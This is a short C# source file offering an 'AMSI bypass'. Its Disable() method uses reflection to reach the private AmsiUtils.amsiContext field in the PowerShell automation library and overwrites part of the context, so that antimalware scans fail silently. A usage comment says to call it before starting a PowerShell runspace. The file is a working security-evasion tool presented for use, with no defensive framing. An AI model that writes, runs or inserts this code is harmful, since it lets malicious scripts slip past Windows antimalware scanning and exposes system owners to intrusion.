// =============================================================================
// C#-Native AMSI Bypass
//
// Disables AMSI from C# by corrupting the AmsiUtils.amsiContext field.
// No PowerShell text signatures - avoids detection that amsi.txt triggers.
//
// Usage:
//   AmsiBypass.Disable();  // call before creating any PowerShell runspace
// =============================================================================

using System;
using System.Reflection;
using System.Runtime.InteropServices;

public static class AmsiBypass
{
    public static bool Disable()
    {
        try
        {
            // Force AMSI to initialize by touching PSObject
            var psType = Type.GetType("System.Management.Automation.PSObject, System.Management.Automation");
            if (psType == null) return false;

            // Get the AmsiUtils type from System.Management.Automation
            var amsiType = Type.GetType("System.Management.Automation.AmsiUtils, System.Management.Automation");
            if (amsiType == null) return false;

            // Get the static amsiContext field
            var ctxField = amsiType.GetField("amsiContext", BindingFlags.NonPublic | BindingFlags.Static);
            if (ctxField == null) return false;

            IntPtr ctx = (IntPtr)ctxField.GetValue(null);
            if (ctx == IntPtr.Zero) return false;

            // Zero 8 bytes at offset 0x8 - corrupts the AMSI context so scans fail silently
            IntPtr target = IntPtr.Add(ctx, 0x8);
            Marshal.WriteInt64(target, 0);

            return true;
        }
        catch { return false; }
    }
}